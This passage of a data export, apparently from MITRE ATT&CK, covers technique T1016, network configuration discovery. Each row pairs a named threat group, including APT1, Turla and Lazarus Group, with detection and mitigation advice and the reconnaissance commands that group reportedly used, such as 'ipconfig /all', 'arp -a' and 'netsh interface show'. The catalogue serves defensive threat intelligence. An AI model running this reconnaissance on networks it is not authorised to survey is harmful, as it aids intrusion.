JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Unknown Logger,['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
352,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0100|ipconfig]] can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.']",['Ke3chang'],['Ke3chang'],['G0004'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: ipconfig, ipconfig.exe",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
353,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0004|Ke3chang]] performs local network configuration discovery using <code>ipconfig /all</code>.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
354,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0100|ipconfig]] can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.']",['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: ipconfig, ipconfig.exe",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
355,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0099|Arp]] can be used to display ARP configuration information on the host.'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Arp, arp.exe",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
356,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0102|nbtstat]] can be used to discover local NetBIOS domain names.'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: nbtstat, nbtstat.exe",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
357,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","['[[Group/G0010|Turla]] surveys a system upon check-in to discover network configuration details using the <code>arp -a</code>, <code>nbtstat -n</code>, and <code>net config</code> commands.[[CiteRef::Kaspersky Turla]]']",['Turla'],"['Turla', 'Waterbug']",['G0010'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
358,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0081|Elise]] executes <code>ipconfig /all</code> after initial communication is made to the remote server.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Elise, BKDR_ESILE, Page",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
359,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0082|Emissary]] has the capability to execute the command <code>ipconfig /all</code>.[[CiteRef::Emissary Trojan Feb 2016]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Emissary,['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
360,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0089|BlackEnergy]] has gathered information about network IP configurations using [[Software/S0100|ipconfig]].exe and about routing tables using [[Software/S0103|route]].exe.[[CiteRef::F-Secure BlackEnergy 2014]][[CiteRef::Securelist BlackEnergy Nov 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: BlackEnergy, Black Energy",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
361,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0060|Sys10]] collects the local IP address of the victim and sends it to the C2.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Sys10,['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
362,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0019|Naikon]] uses commands such as <code>netsh interface show</code> to discover network interface settings.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
363,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0100|ipconfig]] can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.']",['admin@338'],['admin@338'],['G0018'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: ipconfig, ipconfig.exe",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
364,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0018|admin@338]] actors used the following command after exploiting a machine with [[Software/S0042|LOWBALL]] malware to acquire information about local networks: <code>ipconfig /all >> %temp%\\download</code>[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
365,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0038|Stealth Falcon]] malware gathers the Address Resolution Protocol (ARP) table from the victim.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
366,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0084|Mis-Type]] may create a file containing the results of the command <code>cmd.exe /c ipconfig /all</code>.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Mis-Type,['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
367,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0049|GeminiDuke]] collects information on network settings and Internet proxy settings from the victim.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: GeminiDuke,['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
368,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","[""[[Software/S0139|PowerDuke]] has a command to get the victim's domain and NetBIOS name.[[CiteRef::Volexity PowerDuke November 2016]]""]",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: PowerDuke,['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
369,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","[u'[[Group/G0032|Lazarus Group]] malware IndiaIndia obtains and sends to its C2 server information about the first network interface card\u2019s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.[[CiteRef::Novetta Blockbuster Loaders]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
370,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","['A keylogging tool used by [[Group/G0022|APT3]] gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.[[CiteRef::Symantec Buckeye]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
371,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0153|RedLeaves]] can obtain information about network parameters.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 